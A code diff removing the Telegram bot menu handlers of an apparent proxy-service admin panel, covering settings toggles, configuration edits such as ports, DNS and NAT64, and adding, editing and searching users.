-                    await fetchT(`${tgApi}/sendMessage`, {
-                        method: "POST",
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify({
-                            chat_id: chatId,
-                            text: `\`${subUrl}\``,
-                            parse_mode: "Markdown",
-                        }),
-                    });
-                    answerText = t("sub_link_sent");
-                } else if (data === "tg_settings_menu") {
-                    const modeTxt =
-                        sysConfig.mode === "alpha"
-                            ? "Alpha (V)"
-                            : sysConfig.mode === "beta"
-                              ? "Beta (T)"
-                              : "Both";
-                    const portsTxt = sysConfig.socketPorts || "443";
-                    const passTxt = sysConfig.masterKey || "admin";
-                    const dnsTxt = sysConfig.resolveIp || "1.1.1.1";
-                    const relayTxt = sysConfig.backupRelay || "—";
-                    const tfoTxt = sysConfig.enableOpt1 ? "✅" : "❌";
-                    const echTxt = sysConfig.enableOpt2 ? "✅" : "❌";
-                    const pauseTxt = sysConfig.isPaused ? "🔴 ON" : "🟢 OFF";
-                    const silentTxt = sysConfig.silentAlerts ? "✅" : "❌";
-                    const autoUpTxt = sysConfig.autoUpdate ? "✅" : "❌";
-                    const directTxt = sysConfig.enableDirectConfigs
-                        ? "✅"
-                        : "❌";
-                    const nat64Txt = sysConfig.nat64Prefix || "—";
-                    let text = `⚙️ **${t("tg_sys_settings")}**\n━━━━━━━━━━━━━━━━\n`;
-                    text += `📡 ${t("tg_proto")}: **${modeTxt}**\n`;
-                    text += `🔌 ${t("tg_ports")}: \`${portsTxt}\`\n`;
-                    text += `🔑 ${t("tg_pass")}: \`${passTxt}\`\n`;
-                    text += `🌐 ${t("tg_dns")}: \`${dnsTxt}\`\n`;
-                    text += `🔗 ${t("tg_relay")}: \`${relayTxt}\`\n`;
-                    text += `⚡ ${t("tg_tfo")}: ${tfoTxt} | ECH: ${echTxt}\n`;
-                    text += `🔇 ${t("tg_silent")}: ${silentTxt}\n`;
-                    text += `🛑 ${t("tg_pause")}: ${pauseTxt}\n`;
-                    text += `🔄 ${t("tg_auto_update")}: ${autoUpTxt}\n`;
-                    text += `🔀 ${t("tg_direct")}: ${directTxt}\n`;
-                    text += `🌐 ${t("tg_nat64")}: \`${nat64Txt}\`\n`;
-                    text += `━━━━━━━━━━━━━━━━`;
-                    const kb = {
-                        inline_keyboard: [
-                            [
-                                {
-                                    text: `📡 ${t("tg_proto")}`,
-                                    callback_data: "tg_edit_proto",
-                                },
-                                {
-                                    text: `🔌 ${t("tg_ports")}`,
-                                    callback_data: "tg_edit_ports",
-                                },
-                            ],
-                            [
-                                {
-                                    text: `🔑 ${t("tg_pass")}`,
-                                    callback_data: "tg_edit_pass",
-                                },
-                                {
-                                    text: `🌐 ${t("tg_dns")}`,
-                                    callback_data: "tg_edit_dns",
-                                },
-                            ],
-                            [
-                                {
-                                    text: `🔗 ${t("tg_relay")}`,
-                                    callback_data: "tg_edit_relay",
-                                },
-                            ],
-                            [
-                                {
-                                    text: `⚡ ${t("tg_tfo")}`,
-                                    callback_data: "tg_toggle_tfo",
-                                },
-                                { text: `ECH`, callback_data: "tg_toggle_ech" },
-                            ],
-                            [
-                                {
-                                    text: `${t("tg_silent")}`,
-                                    callback_data: "tg_toggle_silent",
-                                },
-                                {
-                                    text: `${t("tg_pause")}`,
-                                    callback_data: "tg_toggle_pause2",
-                                },
-                            ],
-                            [
-                                {
-                                    text: `🔄 ${t("tg_auto_update")}`,
-                                    callback_data: "tg_toggle_auto_update",
-                                },
-                                {
-                                    text: `🔀 ${t("tg_direct")}`,
-                                    callback_data: "tg_toggle_direct",
-                                },
-                            ],
-                            [
-                                {
-                                    text: `🌐 ${t("tg_nat64")}`,
-                                    callback_data: "tg_edit_nat64",
-                                },
-                            ],
-                            [
-                                {
-                                    text: t("btn_main_menu"),
-                                    callback_data: "main_menu",
-                                },
-                            ],
-                        ],
-                    };
-                    await sendOrEdit(chatId, text, kb, messageId);
-                } else if (data === "tg_advanced_menu") {
-                    const cleanTxt = sysConfig.cleanIps
-                        ? sysConfig.cleanIps.substring(0, 40) +
-                          (sysConfig.cleanIps.length > 40 ? "..." : "")
-                        : "—";
-                    const lpUrls = (sysConfig.linkedPanels || []).map(p => p.url).filter(Boolean);
-                    const nodesTxt = lpUrls.length > 0
-                        ? lpUrls.join(", ").substring(0, 40) +
-                          (lpUrls.join(", ").length > 40 ? "..." : "")
-                        : "—";
-                    const strategyTxt = sysConfig.nameStrategy || "default";
-                    const prefixTxt = sysConfig.namePrefix || "Core";
-                    const maintenanceTxt = sysConfig.maintenanceHost
-                        ? sysConfig.maintenanceHost.substring(0, 30) + "..."
-                        : "—";
-                    let text = `🔧 **${t("tg_adv_settings")}**\n━━━━━━━━━━━━━━━━\n`;
-                    text += `🧹 ${t("tg_clean_ips")}: \`${cleanTxt}\`\n`;
-                    text += `🖥️ ${t("tg_nodes")}: \`${nodesTxt}\`\n`;
-                    text += `📝 ${t("tg_strategy")}: \`${strategyTxt}\`\n`;
-                    text += `🏷️ ${t("tg_prefix")}: \`${prefixTxt}\`\n`;
-                    text += `🎭 ${t("tg_maintenance")}: \`${maintenanceTxt}\`\n`;
-                    text += `━━━━━━━━━━━━━━━━`;
-                    const kb = {
-                        inline_keyboard: [
-                            [
-                                {
-                                    text: `🧹 ${t("tg_clean_ips")}`,
-                                    callback_data: "tg_edit_clean_ips",
-                                },
-                            ],
-                            [
-                                {
-                                    text: `🖥️ ${t("tg_nodes")}`,
-                                    callback_data: "tg_edit_nodes",
-                                },
-                            ],
-                            [
-                                {
-                                    text: `📝 ${t("tg_strategy")}`,
-                                    callback_data: "tg_edit_strategy",
-                                },
-                                {
-                                    text: `🏷️ ${t("tg_prefix")}`,
-                                    callback_data: "tg_edit_prefix",
-                                },
-                            ],
-                            [
-                                {
-                                    text: `🎭 ${t("tg_maintenance")}`,
-                                    callback_data: "tg_edit_maintenance",
-                                },
-                            ],
-                            [
-                                {
-                                    text: `🤖 ${t("tg_tg_settings")}`,
-                                    callback_data: "tg_edit_tg_settings",
-                                },
-                            ],
-                            [
-                                {
-                                    text: `☁️ ${t("tg_cf_settings")}`,
-                                    callback_data: "tg_edit_cf_settings",
-                                },
-                            ],
-                            [
-                                {
-                                    text: t("btn_main_menu"),
-                                    callback_data: "main_menu",
-                                },
-                            ],
-                        ],
-                    };
-                    await sendOrEdit(chatId, text, kb, messageId);
-                } else if (data === "tg_logs_menu") {
-                    let logs = [];
-                    if (env.IOT_DB) {
-                        const stored = await d1Get(env, "sys_logs");
-                        if (stored) logs = JSON.parse(stored);
-                    }
-                    let text = `📋 **${t("tg_logs")}**\n━━━━━━━━━━━━━━━━\n`;
-                    if (logs.length === 0) {
-                        text += `ℹ️ ${t("tg_log_empty")}\n`;
-                    } else {
-                        logs.slice(0, 10).forEach((log, i) => {
-                            const time = new Date(log.ts).toLocaleString();
-                            text += `${i + 1}. ${t("tg_log_entry")} **${log.type}**\n   ${log.detail}\n   📅 ${time}\n`;
-                        });
-                        if (logs.length > 10)
-                            text += `\n... ${logs.length - 10} more entries`;
-                    }
-                    text += `\n━━━━━━━━━━━━━━━━`;
-                    const kb = {
-                        inline_keyboard: [
-                            [
-                                {
-                                    text: `🔄 ${t("btn_update_usage")}`,
-                                    callback_data: "tg_logs_menu",
-                                },
-                            ],
-                            [
-                                {
-                                    text: t("btn_main_menu"),
-                                    callback_data: "main_menu",
-                                },
-                            ],
-                        ],
-                    };
-                    await sendOrEdit(chatId, text, kb, messageId);
-                } else if (data === "tg_toggle_tfo") {
-                    sysConfig.enableOpt1 = !sysConfig.enableOpt1;
-                    await cachedD1Put(
-                        env,
-                        "sys_config",
-                        JSON.stringify(sysConfig),
-                    );
-                    answerText = t("tg_saved");
-                    const menu = getMainMenu(getActivePanel(), isAuthorized);
-                    await sendOrEdit(chatId, menu.text, menu.kb, messageId);
-                } else if (data === "tg_toggle_ech") {
-                    sysConfig.enableOpt2 = !sysConfig.enableOpt2;
-                    await cachedD1Put(
-                        env,
-                        "sys_config",
-                        JSON.stringify(sysConfig),
-                    );
-                    answerText = t("tg_saved");
-                    const menu = getMainMenu(getActivePanel(), isAuthorized);
-                    await sendOrEdit(chatId, menu.text, menu.kb, messageId);
-                } else if (data === "tg_toggle_silent") {
-                    sysConfig.silentAlerts = !sysConfig.silentAlerts;
-                    await cachedD1Put(
-                        env,
-                        "sys_config",
-                        JSON.stringify(sysConfig),
-                    );
-                    answerText = t("tg_saved");
-                    const menu = getMainMenu(getActivePanel(), isAuthorized);
-                    await sendOrEdit(chatId, menu.text, menu.kb, messageId);
-                } else if (data === "tg_toggle_pause2") {
-                    sysConfig.isPaused = !sysConfig.isPaused;
-                    await cachedD1Put(
-                        env,
-                        "sys_config",
-                        JSON.stringify(sysConfig),
-                    );
-                    answerText = t("tg_saved");
-                    const menu = getMainMenu(getActivePanel(), isAuthorized);
-                    await sendOrEdit(chatId, menu.text, menu.kb, messageId);
-                } else if (data === "tg_toggle_auto_update") {
-                    sysConfig.autoUpdate = !sysConfig.autoUpdate;
-                    await cachedD1Put(
-                        env,
-                        "sys_config",
-                        JSON.stringify(sysConfig),
-                    );
-                    answerText = t("tg_saved");
-                    await sendOrEdit(
-                        chatId,
-                        `⚙️ ${t("tg_auto_update")}: ${sysConfig.autoUpdate ? "✅ ON" : "❌ OFF"}`,
-                        {
-                            inline_keyboard: [
-                                [
-                                    {
-                                        text: "◀️ " + t("btn_back"),
-                                        callback_data: "tg_settings_menu",
-                                    },
-                                ],
-                            ],
-                        },
-                        messageId,
-                    );
-                } else if (data === "tg_toggle_direct") {
-                    sysConfig.enableDirectConfigs =
-                        !sysConfig.enableDirectConfigs;
-                    await cachedD1Put(
-                        env,
-                        "sys_config",
-                        JSON.stringify(sysConfig),
-                    );
-                    answerText = t("tg_saved");
-                    await sendOrEdit(
-                        chatId,
-                        `🔀 ${t("tg_direct")}: ${sysConfig.enableDirectConfigs ? "✅ ON" : "❌ OFF"}`,
-                        {
-                            inline_keyboard: [
-                                [
-                                    {
-                                        text: "◀️ " + t("btn_back"),
-                                        callback_data: "tg_settings_menu",
-                                    },
-                                ],
-                            ],
-                        },
-                        messageId,
-                    );
-                } else if (data === "tg_edit_proto") {
-                    tgState[chatId] = { step: "tg_edit_proto" };
-                    ctx?.waitUntil(
-                        d1Put(
-                            env,
-                            "tg_bot_state",
-                            JSON.stringify(tgState),
-                        ).catch(() => {}),
-                    );
-                    const kb = {
-                        inline_keyboard: [
-                            [
-                                {
-                                    text: "Alpha (V-Core)",
-                                    callback_data: "tg_set_proto:alpha",
-                                },
-                                {
-                                    text: "Beta (T-Core)",
-                                    callback_data: "tg_set_proto:beta",
-                                },
-                            ],
-                            [
-                                {
-                                    text: "Both",
-                                    callback_data: "tg_set_proto:both",
-                                },
-                            ],
-                            [
-                                {
-                                    text: "❌ " + t("btn_cancel"),
-                                    callback_data: "tg_settings_menu",
-                                },
-                            ],
-                        ],
-                    };
-                    await sendOrEdit(
-                        chatId,
-                        `📡 **${t("tg_proto")}**\n${t("tg_current_val")}: **${sysConfig.mode}**\n\n${t("tg_new_val")}`,
-                        kb,
-                        messageId,
-                    );
-                } else if (data.startsWith("tg_set_proto:")) {
-                    const val = data.replace("tg_set_proto:", "");
-                    sysConfig.mode = val;
-                    await cachedD1Put(
-                        env,
-                        "sys_config",
-                        JSON.stringify(sysConfig),
-                    );
-                    tgState[chatId] = null;
-                    answerText = t("tg_saved");
-                    await sendOrEdit(
-                        chatId,
-                        `✅ ${t("tg_proto")}: **${val}**`,
-                        {
-                            inline_keyboard: [
-                                [
-                                    {
-                                        text: "◀️ " + t("btn_back"),
-                                        callback_data: "tg_settings_menu",
-                                    },
-                                ],
-                            ],
-                        },
-                        messageId,
-                    );
-                } else if (data === "tg_edit_dns") {
-                    tgState[chatId] = { step: "tg_edit_dns" };
-                    ctx?.waitUntil(
-                        d1Put(
-                            env,
-                            "tg_bot_state",
-                            JSON.stringify(tgState),
-                        ).catch(() => {}),
-                    );
-                    await sendOrEdit(
-                        chatId,
-                        `🌐 **${t("tg_dns")}**\n${t("tg_current_val")}: \`${sysConfig.resolveIp}\`\n\n${t("tg_new_val")}`,
-                        {
-                            inline_keyboard: [
-                                [
-                                    {
-                                        text: "❌ " + t("btn_cancel"),
-                                        callback_data: "tg_settings_menu",
-                                    },
-                                ],
-                            ],
-                        },
-                        messageId,
-                    );
-                } else if (data === "tg_edit_relay") {
-                    tgState[chatId] = { step: "tg_edit_relay" };
-                    ctx?.waitUntil(
-                        d1Put(
-                            env,
-                            "tg_bot_state",
-                            JSON.stringify(tgState),
-                        ).catch(() => {}),
-                    );
-                    await sendOrEdit(
-                        chatId,
-                        `🔗 **${t("tg_relay")}**\n${t("tg_current_val")}: \`${sysConfig.backupRelay || "—"}\`\n\n${t("tg_new_val")}\n_send empty to clear_`,
-                        {
-                            inline_keyboard: [
-                                [
-                                    {
-                                        text: "❌ " + t("btn_cancel"),
-                                        callback_data: "tg_settings_menu",
-                                    },
-                                ],
-                            ],
-                        },
-                        messageId,
-                    );
-                } else if (data === "tg_edit_nat64") {
-                    tgState[chatId] = { step: "tg_edit_nat64" };
-                    ctx?.waitUntil(
-                        d1Put(
-                            env,
-                            "tg_bot_state",
-                            JSON.stringify(tgState),
-                        ).catch(() => {}),
-                    );
-                    await sendOrEdit(
-                        chatId,
-                        `🌐 **${t("tg_nat64")}**\n${t("tg_current_val")}: \`${sysConfig.nat64Prefix || "—"}\`\n\n${t("tg_new_val")}\n_send empty to clear_`,
-                        {
-                            inline_keyboard: [
-                                [
-                                    {
-                                        text: "❌ " + t("btn_cancel"),
-                                        callback_data: "tg_settings_menu",
-                                    },
-                                ],
-                            ],
-                        },
-                        messageId,
-                    );
-                } else if (data === "tg_edit_maintenance") {
-                    tgState[chatId] = { step: "tg_edit_maintenance" };
-                    ctx?.waitUntil(
-                        d1Put(
-                            env,
-                            "tg_bot_state",
-                            JSON.stringify(tgState),
-                        ).catch(() => {}),
-                    );
-                    await sendOrEdit(
-                        chatId,
-                        `🎭 **${t("tg_maintenance")}**\n${t("tg_current_val")}: \`${sysConfig.maintenanceHost || "—"}\`\n\n${t("tg_new_val")}`,
-                        {
-                            inline_keyboard: [
-                                [
-                                    {
-                                        text: "❌ " + t("btn_cancel"),
-                                        callback_data: "tg_settings_menu",
-                                    },
-                                ],
-                            ],
-                        },
-                        messageId,
-                    );
-                } else if (data === "tg_edit_clean_ips") {
-                    tgState[chatId] = { step: "tg_edit_clean_ips" };
-                    ctx?.waitUntil(
-                        d1Put(
-                            env,
-                            "tg_bot_state",
-                            JSON.stringify(tgState),
-                        ).catch(() => {}),
-                    );
-                    await sendOrEdit(
-                        chatId,
-                        `🧹 **${t("tg_clean_ips")}**\n${t("tg_current_val")}: \`${sysConfig.cleanIps || "—"}\`\n\n${t("tg_new_val")}\n_send empty to clear_`,
-                        {
-                            inline_keyboard: [
-                                [
-                                    {
-                                        text: "❌ " + t("btn_cancel"),
-                                        callback_data: "tg_advanced_menu",
-                                    },
-                                ],
-                            ],
-                        },
-                        messageId,
-                    );
-                } else if (data === "tg_edit_nodes") {
-                    let lpList = (sysConfig.linkedPanels || [])
-                        .map((p, i) => `${i + 1}. \`${p.url}\``)
-                        .join("\n");
-                    if (!lpList) lpList = "—";
-                    const warningMsg = langCode === "fa"
-                        ? `🖥️ **${t("tg_nodes")}**\n\n${lpList}\n\n⚠️ لطفاً برای افزودن، حذف یا ویرایش نودهای خارجی به صورت امن همراه با کلید دسترسی (API Key)، از داشبورد تحت وب استفاده کنید.`
-                        : `🖥️ **${t("tg_nodes")}**\n\n${lpList}\n\n⚠️ Please use the Web Dashboard to add, remove, or edit external nodes securely with API Keys.`;
-                    await sendOrEdit(
-                        chatId,
-                        warningMsg,
-                        {
-                            inline_keyboard: [
-                                [
-                                    {
-                                        text: "◀️ " + t("btn_back"),
-                                        callback_data: "tg_advanced_menu",
-                                    },
-                                ],
-                            ],
-                        },
-                        messageId,
-                    );
-                } else if (data === "tg_edit_strategy") {
-                    tgState[chatId] = { step: "tg_edit_strategy" };
-                    ctx?.waitUntil(
-                        d1Put(
-                            env,
-                            "tg_bot_state",
-                            JSON.stringify(tgState),
-                        ).catch(() => {}),
-                    );
-                    const kb = {
-                        inline_keyboard: [
-                            [
-                                {
-                                    text: "default",
-                                    callback_data: "tg_set_strategy:default",
-                                },
-                            ],
-                            [
-                                {
-                                    text: "type-user-port",
-                                    callback_data:
-                                        "tg_set_strategy:type-user-port",
-                                },
-                            ],
-                            [
-                                {
-                                    text: "user-port",
-                                    callback_data: "tg_set_strategy:user-port",
-                                },
-                            ],
-                            [
-                                {
-                                    text: "ip",
-                                    callback_data: "tg_set_strategy:ip",
-                                },
-                            ],
-                            [
-                                {
-                                    text: "❌ " + t("btn_cancel"),
-                                    callback_data: "tg_advanced_menu",
-                                },
-                            ],
-                        ],
-                    };
-                    await sendOrEdit(
-                        chatId,
-                        `📝 **${t("tg_strategy")}**\n${t("tg_current_val")}: \`${sysConfig.nameStrategy}\`\n\n_send custom or select:_`,
-                        kb,
-                        messageId,
-                    );
-                } else if (data.startsWith("tg_set_strategy:")) {
-                    const val = data.replace("tg_set_strategy:", "");
-                    sysConfig.nameStrategy = val;
-                    await cachedD1Put(
-                        env,
-                        "sys_config",
-                        JSON.stringify(sysConfig),
-                    );
-                    tgState[chatId] = null;
-                    answerText = t("tg_saved");
-                    await sendOrEdit(
-                        chatId,
-                        `✅ ${t("tg_strategy")}: **${val}**`,
-                        {
-                            inline_keyboard: [
-                                [
-                                    {
-                                        text: "◀️ " + t("btn_back"),
-                                        callback_data: "tg_advanced_menu",
-                                    },
-                                ],
-                            ],
-                        },
-                        messageId,
-                    );
-                } else if (data === "tg_edit_prefix") {
-                    tgState[chatId] = { step: "tg_edit_prefix" };
-                    ctx?.waitUntil(
-                        d1Put(
-                            env,
-                            "tg_bot_state",
-                            JSON.stringify(tgState),
-                        ).catch(() => {}),
-                    );
-                    await sendOrEdit(
-                        chatId,
-                        `🏷️ **${t("tg_prefix")}**\n${t("tg_current_val")}: \`${sysConfig.namePrefix}\`\n\n${t("tg_new_val")}`,
-                        {
-                            inline_keyboard: [
-                                [
-                                    {
-                                        text: "❌ " + t("btn_cancel"),
-                                        callback_data: "tg_advanced_menu",
-                                    },
-                                ],
-                            ],
-                        },
-                        messageId,
-                    );
-                } else if (data === "tg_edit_pass") {
-                    tgState[chatId] = { step: "tg_edit_pass" };
-                    ctx?.waitUntil(
-                        d1Put(
-                            env,
-                            "tg_bot_state",
-                            JSON.stringify(tgState),
-                        ).catch(() => {}),
-                    );
-                    await sendOrEdit(
-                        chatId,
-                        `🔑 **${t("tg_pass")}**\n${t("tg_current_val")}: \`${sysConfig.masterKey}\`\n\n${t("tg_new_val")}`,
-                        {
-                            inline_keyboard: [
-                                [
-                                    {
-                                        text: "❌ " + t("btn_cancel"),
-                                        callback_data: "tg_settings_menu",
-                                    },
-                                ],
-                            ],
-                        },
-                        messageId,
-                    );
-                } else if (data === "tg_edit_ports") {
-                    tgState[chatId] = { step: "tg_edit_ports" };
-                    ctx?.waitUntil(
-                        d1Put(
-                            env,
-                            "tg_bot_state",
-                            JSON.stringify(tgState),
-                        ).catch(() => {}),
-                    );
-                    await sendOrEdit(
-                        chatId,
-                        `🔌 **${t("tg_ports")}**\n${t("tg_current_val")}: \`${sysConfig.socketPorts}\`\n\n${t("tg_new_val")}\n_comma separated e.g. 443,80_`,
-                        {
-                            inline_keyboard: [
-                                [
-                                    {
-                                        text: "❌ " + t("btn_cancel"),
-                                        callback_data: "tg_settings_menu",
-                                    },
-                                ],
-                            ],
-                        },
-                        messageId,
-                    );
-                } else if (data === "tg_edit_tg_settings") {
-                    tgState[chatId] = { step: "tg_edit_tg_token" };
-                    ctx?.waitUntil(
-                        d1Put(
-                            env,
-                            "tg_bot_state",
-                            JSON.stringify(tgState),
-                        ).catch(() => {}),
-                    );
-                    await sendOrEdit(
-                        chatId,
-                        `🤖 **${t("tg_tg_settings")}**\n\n1️⃣ ${t("tg_current_val")}: \`${sysConfig.tgToken ? "***" + sysConfig.tgToken.slice(-4) : "—"}\`\n\n${t("tg_new_val")}\n_send /skip to keep current_`,
-                        {
-                            inline_keyboard: [
-                                [
-                                    {
-                                        text: "❌ " + t("btn_cancel"),
-                                        callback_data: "tg_advanced_menu",
-                                    },
-                                ],
-                            ],
-                        },
-                        messageId,
-                    );
-                } else if (data === "tg_edit_cf_settings") {
-                    tgState[chatId] = { step: "tg_edit_cf_acc" };
-                    ctx?.waitUntil(
-                        d1Put(
-                            env,
-                            "tg_bot_state",
-                            JSON.stringify(tgState),
-                        ).catch(() => {}),
-                    );
-                    await sendOrEdit(
-                        chatId,
-                        `☁️ **${t("tg_cf_settings")}**\n\n1️⃣ CF Account ID: \`${sysConfig.cfAccountId || "—"}\`\n\n${t("tg_new_val")}\n_send /skip to keep current_`,
-                        {
-                            inline_keyboard: [
-                                [
-                                    {
-                                        text: "❌ " + t("btn_cancel"),
-                                        callback_data: "tg_advanced_menu",
-                                    },
-                                ],
-                            ],
-                        },
-                        messageId,
-                    );
-                }
-
-                ctx?.waitUntil(
-                    fetchT(`${tgApi}/answerCallbackQuery`, {
-                        method: "POST",
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify({
-                            callback_query_id: cb.id,
-                            text: answerText || "Done!",
-                        }),
-                    }).catch(() => {}),
-                );
-            }
-        } else if (update.message && update.message.text) {
-            const chatId = update.message.chat.id;
-            const text = update.message.text.trim();
-
-            if (isAuthorized) {
-                // Get active panel from last login signal
-                const activePanel = getActivePanel();
-                const isRemotePanel = activePanel && !activePanel.isLocal;
-
-                // Helper to fetch users for the active panel
-                const getPanelUsers = async () => {
-                    if (isRemotePanel) {
-                        const res = await fetchRemotePanelUsers(activePanel);
-                        return res.success ? res.users || [] : null;
-                    }
-                    return sysConfig.users || [];
-                };
-
-                // Handle /start command
-                if (text === "/start") {
-                    tgState[chatId] = null;
-                    ctx?.waitUntil(
-                        d1Put(
-                            env,
-                            "tg_bot_state",
-                            JSON.stringify(tgState),
-                        ).catch(() => {}),
-                    );
-                    const menu = getMainMenu(activePanel, isAuthorized);
-                    await sendOrEdit(chatId, menu.text, menu.kb);
-                    return new Response("OK", { status: 200 });
-                }
-
-                const state = tgState[chatId];
-
-                if (state) {
-                    if (!isAuthorized) {
-                        tgState[chatId] = null;
-                        ctx?.waitUntil(
-                            d1Put(
-                                env,
-                                "tg_bot_state",
-                                JSON.stringify(tgState),
-                            ).catch(() => {}),
-                        );
-                        await sendOrEdit(chatId, t("access_denied"));
-                        return new Response("OK", { status: 200 });
-                    }
-
-                    if (state.step === "sub_add_name") {
-                        const name = text;
-                        tgState[chatId] = {
-                            step: "sub_add_limits",
-                            name: name,
-                        };
-                        ctx?.waitUntil(
-                            d1Put(
-                                env,
-                                "tg_bot_state",
-                                JSON.stringify(tgState),
-                            ).catch(() => {}),
-                        );
-
-                        const msg = `⚙️ **${name}**\n\n${t("msg_enter_limits")}`;
-                        const kb = {
-                            inline_keyboard: [
-                                [
-                                    {
-                                        text: `♾️ Skip (Unlimited)`,
-                                        callback_data: "sub_add_unlimited_skip",
-                                    },
-                                ],
-                                [
-                                    {
-                                        text: `❌ ${t("btn_cancel")}`,
-                                        callback_data: "main_menu",
-                                    },
-                                ],
-                            ],
-                        };
-                        await sendOrEdit(chatId, msg, kb);
-                        return new Response("OK", { status: 200 });
-                    }
-
-                    if (
-                        state.step === "sub_add_limits" ||
-                        state.step === "sub_add_unlimited_skip"
-                    ) {
-                        const name = state.name;
-                        let tReq = null;
-                        let dReq = null;
-                        let days = null;
-
-                        if (
-                            state.step !== "sub_add_unlimited_skip" &&
-                            text !== "0" &&
-                            text !== "0 0 0"
-                        ) {
-                            const parts = text.split(/\s+/).map(Number);
-                            if (parts[0] > 0) tReq = parts[0];
-                            if (parts[1] > 0) dReq = parts[1];
-                            if (parts[2] > 0) days = parts[2];
-                        }
-
-                        const newUuid = crypto.randomUUID();
-                        if (isRemotePanel) {
-                            const res = await remotePanelWriteAction(
-                                activePanel,
-                                "POST",
-                                null,
-                                {
-                                    key: activePanel.apiKey,
-                                    name: name,
-                                    trafficLimit: tReq ? tReq / 6000 : 0,
-                                    dailyLimit: dReq ? dReq / 6000 : 0,
-                                    expiryDays: days || 0,
-                                },
-                            );
-                            if (res.success && res.user) {
-                                const detail = getSubDetail(res.user.id, [
-                                    res.user,
-                                ]);
-                                await sendOrEdit(
-                                    chatId,
-                                    `✅ ${t("msg_added")}\n\n${detail.text}`,
-                                    detail.kb,
-                                );
-                            } else {
-                                await sendOrEdit(chatId, t("msg_panel_error"), {
-                                    inline_keyboard: [
-                                        [
-                                            {
-                                                text: t("btn_main_menu"),
-                                                callback_data: "main_menu",
-                                            },
-                                        ],
-                                    ],
-                                });
-                            }
-                        } else {
-                            if (!sysConfig.users) sysConfig.users = [];
-                            sysConfig.users.push({
-                                id: newUuid,
-                                name: name,
-                                limitTotalReq: tReq,
-                                limitDailyReq: dReq,
-                                expiryMs: days
-                                    ? Date.now() + days * 86400000
-                                    : null,
-                                createdAt: Date.now(),
-                            });
-                            await cachedD1Put(
-                                env,
-                                "sys_config",
-                                JSON.stringify(sysConfig),
-                            );
-                            const detail = getSubDetail(newUuid);
-                            await sendOrEdit(
-                                chatId,
-                                `✅ ${t("msg_added")}\n\n${detail.text}`,
-                                detail.kb,
-                            );
-                        }
-
-                        tgState[chatId] = null;
-                        ctx?.waitUntil(
-                            d1Put(
-                                env,
-                                "tg_bot_state",
-                                JSON.stringify(tgState),
-                            ).catch(() => {}),
-                        );
-                        return new Response("OK", { status: 200 });
-                    }
-
-                    if (state.step.startsWith("sub_edit_name:")) {
-                        const uuid = state.step.replace("sub_edit_name:", "");
-                        if (isRemotePanel) {
-                            await remotePanelWriteAction(
-                                activePanel,
-                                "PUT",
-                                uuid,
-                                { key: activePanel.apiKey, name: text },
-                            );
-                        } else if (sysConfig.users) {
-                            const u = sysConfig.users.find(
-                                (usr) => usr.id === uuid,
-                            );
-                            if (u) {
-                                u.name = text;
-                                await cachedD1Put(
-                                    env,
-                                    "sys_config",
-                                    JSON.stringify(sysConfig),
-                                );
-                            }
-                        }
-                        tgState[chatId] = null;
-                        ctx?.waitUntil(
-                            d1Put(
-                                env,
-                                "tg_bot_state",
-                                JSON.stringify(tgState),
-                            ).catch(() => {}),
-                        );
-
-                        const panelUsers = await getPanelUsers();
-                        const detail = getSubDetail(uuid, panelUsers);
-                        await sendOrEdit(
-                            chatId,
-                            `✅ Successfully Changed!`,
-                            detail.kb,
-                        );
-                        return new Response("OK", { status: 200 });
-                    }
-
-                    if (state.step.startsWith("sub_edit_limits:")) {
-                        const uuid = state.step.replace("sub_edit_limits:", "");
-                        let tReq = null;
-                        let dReq = null;
-                        let days = null;
-
-                        const parts = text.split(/\s+/).map(Number);
-                        if (parts[0] > 0) tReq = parts[0];
-                        if (parts[1] > 0) dReq = parts[1];
-                        if (parts[2] > 0) days = parts[2];
-
-                        if (isRemotePanel) {
-                            await remotePanelWriteAction(
-                                activePanel,
-                                "PUT",
-                                uuid,
-                                {
-                                    key: activePanel.apiKey,
-                                    trafficLimit: tReq ? tReq / 6000 : 0,
-                                    dailyLimit: dReq ? dReq / 6000 : 0,
-                                    expiryDays: days || 0,
-                                },
-                            );
-                        } else if (sysConfig.users) {
-                            const u = sysConfig.users.find(
-                                (usr) => usr.id === uuid,
-                            );
-                            if (u) {
-                                u.limitTotalReq = tReq;
-                                u.limitDailyReq = dReq;
-                                u.expiryMs = days
-                                    ? Date.now() + days * 86400000
-                                    : null;
-                                await cachedD1Put(
-                                    env,
-                                    "sys_config",
-                                    JSON.stringify(sysConfig),
-                                );
-                            }
-                        }
-                        tgState[chatId] = null;
-                        ctx?.waitUntil(
-                            d1Put(
-                                env,
-                                "tg_bot_state",
-                                JSON.stringify(tgState),
-                            ).catch(() => {}),
-                        );
-
-                        const panelUsers = await getPanelUsers();
-                        const detail = getSubDetail(uuid, panelUsers);
-                        await sendOrEdit(
-                            chatId,
-                            `✅ Limits Updated!`,
-                            detail.kb,
-                        );
-                        return new Response("OK", { status: 200 });
-                    }
-
-                    if (state.step === "sub_search") {
-                        const query = text.toLowerCase();
-                        const panelUsers = await getPanelUsers();
-                        const users = panelUsers || [];
-                        const results = users.filter(
-                            (u) =>
-                                u.name.toLowerCase().includes(query) ||
-                                u.id.toLowerCase().includes(query),
-                        );
-                        tgState[chatId] = null;
-                        ctx?.waitUntil(
-                            d1Put(
-                                env,
-                                "tg_bot_state",
-                                JSON.stringify(tgState),
-                            ).catch(() => {}),
-                        );
-                        if (results.length === 0) {
-                            const kb = {
-                                inline_keyboard: [
-                                    [
-                                        {
-                                            text: t("btn_main_menu"),
-                                            callback_data: "main_menu",
-                                        },
-                                    ],
-                                ],
-                            };
-                            await sendOrEdit(
-                                chatId,
-                                `🔍 No users found for "${text}"`,
-                                kb,
-                            );
-                        } else {
-                            let searchText = `🔍 **Search Results** (${results.length})\n━━━━━━━━━━━━━━━━\n`;
-                            const inline_keyboard = [];
-                            results.slice(0, 10).forEach((u) => {
-                                const statusEmoji = u.isPaused
-                                    ? "⏸️"
-                                    : u.expiryMs && Date.now() > u.expiryMs
-                                      ? "🔴"
-                                      : "🟢";
-                                searchText += `${statusEmoji} **${u.name}**\n`;
-                                inline_keyboard.push([
-                                    {
-                                        text: `👤 ${u.name}`,
-                                        callback_data: `sub_detail:${u.id}`,
-                                    },
-                                ]);
-                            });
-                            inline_keyboard.push([
-                                {
-                                    text: t("btn_main_menu"),
-                                    callback_data: "main_menu",
-                                },
-                            ]);
-                            await sendOrEdit(chatId, searchText, {
-                                inline_keyboard,
-                            });
-                        }
-                        return new Response("OK", { status: 200 });
-                    }
-
